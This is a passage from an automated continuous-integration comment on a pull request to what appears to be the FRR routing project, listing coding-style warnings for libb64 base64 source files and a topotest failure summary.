/tmp/f1-10645/base64.c:34:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #36: FILE: /tmp/f1-10645/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #36: FILE: /tmp/f1-10645/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #39: FILE: /tmp/f1-10645/base64.c:39:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #51: FILE: /tmp/f1-10645/base64.c:51:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #63: FILE: /tmp/f1-10645/base64.c:63:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #76: FILE: /tmp/f1-10645/base64.c:76:\n    +\t\t\tif (state_in->stepcount == CHARS_PER_LINE/4)\n    +\t\t\t{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-10645/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-10645/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #89: FILE: /tmp/f1-10645/base64.c:89:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #91: FILE: /tmp/f1-10645/base64.c:91:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-10645/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-10645/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-10645/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-10645/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-10645/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-10645/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-10645/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-10645/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-10645/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-10645/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-10645/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-10645/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-10645/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-10645/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-10645/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-10645/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #115: FILE: /tmp/f1-10645/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                    ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #115: FILE: /tmp/f1-10645/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                     ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-10645/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                   ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-10645/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-10645/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-10645/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-10645/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t          ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-10645/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-10645/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-10645/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-10645/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-10645/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-10645/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-10645/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-10645/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-10645/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-10645/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-10645/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-10645/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-10645/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-10645/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-10645/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-10645/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-10645/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-10645/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-10645/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-10645/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-10645/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-10645/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-10645/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-10645/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-10645/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-10645/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-10645/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-10645/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-10645/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-10645/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-10645/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-10645/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-10645/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-10645/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-10645/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-10645/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-10645/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-10645/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                    ^\n    \n    WARNING: Missing a blank line after declarations\n    #126: FILE: /tmp/f1-10645/base64.c:126:\n    +\tstatic const char decoding_size = sizeof(decoding);\n    +\tvalue_in -= 43;\n    \n    ERROR: trailing statements should be on next line\n    #127: FILE: /tmp/f1-10645/base64.c:127:\n    +\tif (value_in < 0 || value_in >= decoding_size) return -1;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #131: FILE: /tmp/f1-10645/base64.c:131:\n    +void base64_init_decodestate(base64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #137: FILE: /tmp/f1-10645/base64.c:137:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #137: FILE: /tmp/f1-10645/base64.c:137:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #138: FILE: /tmp/f1-10645/base64.c:138:\n    +\t\t\tbase64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #140: FILE: /tmp/f1-10645/base64.c:140:\n    +\tconst char* codechar = code_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #141: FILE: /tmp/f1-10645/base64.c:141:\n    +\tchar* plainchar = plaintext_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #146: FILE: /tmp/f1-10645/base64.c:146:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #148: FILE: /tmp/f1-10645/base64.c:148:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #148: FILE: /tmp/f1-10645/base64.c:148:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #152: FILE: /tmp/f1-10645/base64.c:152:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #164: FILE: /tmp/f1-10645/base64.c:164:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #177: FILE: /tmp/f1-10645/base64.c:177:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #190: FILE: /tmp/f1-10645/base64.c:190:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    Report for base64.h | 85 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-10645/base64.h:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    WARNING: do not add new typedefs\n    #9: FILE: /tmp/f1-10645/base64.h:9:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #10: FILE: /tmp/f1-10645/base64.h:10:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #14: FILE: /tmp/f1-10645/base64.h:14:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #15: FILE: /tmp/f1-10645/base64.h:15:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #21: FILE: /tmp/f1-10645/base64.h:21:\n    +void base64_init_encodestate(base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-10645/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-10645/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-10645/base64.h:26:\n    +\t\t\tbase64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-10645/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-10645/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    WARNING: do not add new typedefs\n    #31: FILE: /tmp/f1-10645/base64.h:31:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #32: FILE: /tmp/f1-10645/base64.h:32:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #36: FILE: /tmp/f1-10645/base64.h:36:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #37: FILE: /tmp/f1-10645/base64.h:37:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #42: FILE: /tmp/f1-10645/base64.h:42:\n    +void base64_init_decodestate(base64_decodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-10645/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-10645/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #47: FILE: /tmp/f1-10645/base64.h:47:\n    +\t\t\tbase64_decodestate* state_in);\n    \n    WARNING: C99 // comments do not match recommendation\n    #49: FILE: /tmp/f1-10645/base64.h:49:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 8 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-10645/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #691: FILE: /tmp/f1-10645/yang_wrappers.c:691:\n    < WARNING: Missing a blank line after declarations\n    < #696: FILE: /tmp/f1-10645/yang_wrappers.c:696:\n    < WARNING: Missing a blank line after declarations\n    < #709: FILE: /tmp/f1-10645/yang_wrappers.c:709:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3568/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests debian 10 amd64 part 4: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO4DEB10AMD64-3568/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 4__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3568/artifact/TOPO4DEB10AMD64/ErrorLog/log_topotests.txt\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 arm8 part 3\n- Addresssanitizer topotests part 4\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 amd64 part 2\n- Addresssanitizer topotests part 5\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests debian 10 amd64 part 8\n- Addresssanitizer topotests part 0\n- Topotests Ubuntu 18.04 arm8 part 4\n- IPv6 protocols on Ubuntu 18.04\n- Topotests debian 10 amd64 part 3\n- Topotests Ubuntu 18.04 arm8 part 9\n- Topotests debian 10 amd64 part 0\n- IPv4 ldp protocol on Ubuntu 18.04\n- Ubuntu 16.04 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 5\n- Topotests Ubuntu 18.04 arm8 part 2\n- Ubuntu 20.04 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 8\n- Topotests Ubuntu 18.04 i386 part 1\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 amd64 part 4\n- IPv4 protocols on Ubuntu 18.04\n- Topotests Ubuntu 18.04 i386 part 6\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 arm8 part 7\n- Debian 10 deb pkg check\n- Addresssanitizer topotests part 7\n- Topotests Ubuntu 18.04 amd64 part 7\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 i386 part 5\n- Addresssanitizer topotests part 3\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests debian 10 amd64 part 1\n- Topotests Ubuntu 18.04 arm8 part 5\n- CentOS 7 rpm pkg check\n- Fedora 29 rpm pkg check\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests debian 10 amd64 part 2\n- Static analyzer (clang)\n- Addresssanitizer topotests part 2\n- Debian 9 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 1\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests debian 10 amd64 part 5\n- Ubuntu 18.04 deb pkg check\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 arm8 part 6\n- Addresssanitizer topotests part 8\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 8\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 amd64 part 6\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Topotests debian 10 amd64 part 4: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO4DEB10AMD64-3568/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 4__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3568/artifact/TOPO4DEB10AMD64/ErrorLog/log_topotests.txt\n</details>\n\n    <stdin>:285: new blank line at EOF.\n    +\n    warning: 1 line adds whitespace errors.\n    Report for base64.c | 72 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-4770/base64.c:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #10: FILE: /tmp/f1-4770/base64.c:10:\n    +void base64_init_encodestate(base64_encodestate* state_in)\n    \n    WARNING: line over 80 characters\n    #19: FILE: /tmp/f1-4770/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #19: FILE: /tmp/f1-4770/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    WARNING: Missing a blank line after declarations\n    #20: FILE: /tmp/f1-4770/base64.c:20:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    +\tif (value_in > 63) return '=';\n    \n    ERROR: trailing statements should be on next line\n    #20: FILE: /tmp/f1-4770/base64.c:20:\n    +\tif (value_in > 63) return '=';\n    \n    WARNING: line over 80 characters\n    #24: FILE: /tmp/f1-4770/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-4770/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-4770/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-4770/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-4770/base64.c:26:\n    +\tconst char* plainchar = plaintext_in;\n    \n    ERROR: \"foo* const bar\" should be \"foo * const bar\"\n    #27: FILE: /tmp/f1-4770/base64.c:27:\n    +\tconst char* const plaintextend = plaintext_in + length_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-4770/base64.c:28:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #34: FILE: /tmp/f1-4770/base64.c:34:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #36: FILE: 